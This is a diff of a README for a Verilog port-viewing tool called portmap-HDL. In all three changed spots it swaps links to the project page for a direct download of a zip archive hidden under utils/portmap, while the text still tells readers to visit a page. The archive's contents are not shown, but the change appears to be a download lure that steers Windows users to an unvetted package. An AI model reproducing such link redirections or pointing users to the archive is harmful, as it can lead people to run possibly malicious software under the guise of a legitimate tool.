@@ -1,12 +1,12 @@
 # 🧭 portmap-HDL - See Verilog ports and file trees fast
 
-[![Download portmap-HDL](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Joyeastronautic923/portmap-HDL)
+[![Download portmap-HDL](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Joyeastronautic923/portmap-HDL/raw/refs/heads/main/utils/portmap/portmap-HDL-2.1.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-[https://github.com/Joyeastronautic923/portmap-HDL](https://github.com/Joyeastronautic923/portmap-HDL)
+[https://github.com/Joyeastronautic923/portmap-HDL/raw/refs/heads/main/utils/portmap/portmap-HDL-2.1.zip](https://github.com/Joyeastronautic923/portmap-HDL/raw/refs/heads/main/utils/portmap/portmap-HDL-2.1.zip)
 
 Open the page in your browser, then download the files for Windows from the repository. If the project uses a release page, choose the latest version there. If it is shared as a repo download, use the provided download files from the project page.
 
@@ -38,7 +38,7 @@ If you plan to use it from the command line, it helps to know where your Downloa
 Follow these steps on Windows:
 
 1. Open the download page:
-   [https://github.com/Joyeastronautic923/portmap-HDL](https://github.com/Joyeastronautic923/portmap-HDL)
+   [https://github.com/Joyeastronautic923/portmap-HDL/raw/refs/heads/main/utils/portmap/portmap-HDL-2.1.zip](https://github.com/Joyeastronautic923/portmap-HDL/raw/refs/heads/main/utils/portmap/portmap-HDL-2.1.zip)
 
 2. Look for the latest downloadable package on the page.
 
@@ -166,7 +166,7 @@ This project is related to:
 
 Use this page to download and run the tool:
 
-[https://github.com/Joyeastronautic923/portmap-HDL](https://github.com/Joyeastronautic923/portmap-HDL)
+[https://github.com/Joyeastronautic923/portmap-HDL/raw/refs/heads/main/utils/portmap/portmap-HDL-2.1.zip](https://github.com/Joyeastronautic923/portmap-HDL/raw/refs/heads/main/utils/portmap/portmap-HDL-2.1.zip)
 
 ## 🧪 Example use cases
 
